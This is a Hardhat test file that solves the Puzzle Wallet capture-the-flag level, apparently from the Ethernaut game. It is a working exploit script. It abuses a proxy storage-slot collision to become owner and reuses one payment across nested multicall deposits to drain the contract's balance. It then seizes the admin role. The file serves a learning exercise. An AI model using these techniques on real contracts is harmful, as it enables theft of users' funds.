import { ethers } from "hardhat";
import { expectLevelSolved } from "../utils";
import { txConfirmation } from "./utils";

describe("Puzzle Wallet Solution", function () {
  it("Should solve the level", expectLevelSolved({
    deployId: "24", 
    solutionFn: async ({ challenge, accounts: [ eoa ] }) => {
      // step 1: get whitelisted
      const challengeAsPuzzleProxy = await ethers.getContractAt(
        "PuzzleProxy", challenge.address
      );
      await txConfirmation(challengeAsPuzzleProxy.proposeNewAdmin(eoa.address));
      await txConfirmation(challenge.addToWhitelist(eoa.address));
      // step 2: remove all balance in challenge contract
      await txConfirmation(challenge.multicall([
        challenge.interface.encodeFunctionData("deposit"),
        challenge.interface.encodeFunctionData("multicall", [[
          challenge.interface.encodeFunctionData("deposit")
        ]])
      ], { value: challenge.provider.getBalance(challenge.address)}))
      await txConfirmation(challenge.execute(eoa.address, await challenge.provider.getBalance(challenge.address), "0x"));
      // step 3: become admin
      await txConfirmation(challenge.setMaxBalance(eoa.address));
    }
  }));
});
